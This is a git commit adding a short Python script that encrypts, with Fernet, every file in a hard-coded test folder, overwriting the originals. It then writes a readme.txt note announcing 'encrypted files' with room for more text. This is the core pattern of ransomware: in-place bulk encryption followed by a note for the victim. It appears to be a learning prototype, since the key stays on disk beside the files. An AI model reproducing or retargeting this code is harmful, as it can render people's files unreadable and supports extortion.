ad36ebeff3af220eae19b3a1dab1e3f77e0c182a
Angel <auseche80@gmail.com>
2024-09-16 10:07:25 -0400

    First commit

---
+++ encrypt.py
@@ -0,0 +1,35 @@
+from cryptography.fernet import Fernet
+import os
+
+def generate_key():
+    key = Fernet.generate_key()
+    with open('key.key', 'wb') as key_file:
+        key_file.write(key)
+
+def load_key():
+    return open('key.key', 'rb').read()
+
+def encrypt(items, key):
+    f = Fernet(key)
+    for item in items:
+        with open(item, 'rb') as file:
+            file_data = file.read()
+        encrypted_data = f.encrypt(file_data)
+        with open(item, 'wb') as file:
+            file.write(encrypted_data)
+
+if __name__ == '__main__':
+
+    path_to_encrypt = 'C:\\Users\\Angel\\Desktop\\Testing\\pyencrypt\\files'
+    items = os.listdir(path_to_encrypt)
+    full_path = [path_to_encrypt+'\\'+item for item in items]
+
+    generate_key()
+    key = load_key()
+
+    encrypt(full_path, key)
+
+    with open(path_to_encrypt+'\\'+'readme.txt', 'w') as file:
+        file.write('encrypted files\n')
+        file.write('add more text if desired')
+
